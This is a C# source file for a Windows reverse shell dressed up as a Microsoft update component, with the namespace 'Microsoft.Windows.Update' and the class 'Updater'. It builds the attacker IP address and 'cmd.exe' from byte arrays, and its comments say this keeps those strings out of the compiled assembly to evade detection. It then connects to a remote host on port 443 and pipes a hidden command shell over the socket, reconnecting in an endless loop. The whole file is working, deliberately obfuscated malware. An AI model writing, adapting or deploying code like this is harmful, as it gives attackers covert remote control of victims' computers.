using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.Net.Sockets;
using System.Threading;
using System.Runtime.InteropServices;

namespace Microsoft.Windows.Update
{
    public class Updater
    {
        // IP y puerto construidos byte a byte -> no aparecen como "172.16.90.100" en el IL
        static readonly string HOST = Encoding.ASCII.GetString(new byte[]{
            0x31,0x37,0x32,0x2e,0x31,0x36,0x2e,0x39,0x30,0x2e,0x31,0x30,0x30
        });
        static readonly int PORT = 443;

        // "cmd.exe" reconstruido -> no aparece el literal en el assembly
        static readonly string SHELL = Encoding.ASCII.GetString(new byte[]{
            0x63,0x6d,0x64,0x2e,0x65,0x78,0x65
        });

        static StreamWriter sw;
        static readonly object writeLock = new object();

        public static void Main()
        {
            while (true)
            {
                try { Run(); }
                catch { Thread.Sleep(5000); }
            }
        }

        static void Run()
        {
            using (var client = new TcpClient())
            {
                client.NoDelay = true;
                client.Connect(HOST, PORT);
                client.Client.SetSocketOption(SocketOptionLevel.Socket,
                    SocketOptionName.KeepAlive, true);

                using (var stream = client.GetStream())
                using (var rdr = new StreamReader(stream, Encoding.UTF8))
                using (sw = new StreamWriter(stream, new UTF8Encoding(false)) { AutoFlush = true })
                {
                    var psi = new ProcessStartInfo(SHELL)
                    {
                        CreateNoWindow = true,
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        RedirectStandardError = true,
                        RedirectStandardInput = true,
                        WorkingDirectory = @"C:\",
                        StandardOutputEncoding = Encoding.GetEncoding(850),
                        StandardErrorEncoding = Encoding.GetEncoding(850)
                    };

                    var p = new Process { StartInfo = psi };
                    p.OutputDataReceived += (s, e) => Write(e.Data);
                    p.ErrorDataReceived  += (s, e) => Write(e.Data);
                    p.Start();
                    p.BeginOutputReadLine();
                    p.BeginErrorReadLine();

                    string line;
                    while ((line = rdr.ReadLine()) != null)
                    {
                        if (p.HasExited) break;
                        p.StandardInput.WriteLine(line);
                    }
                }
            }
        }

        static void Write(string data)
        {
            if (string.IsNullOrEmpty(data)) return;
            lock (writeLock)
            {
                try { sw.WriteLine(data); } catch { }
            }
        }
    }
}
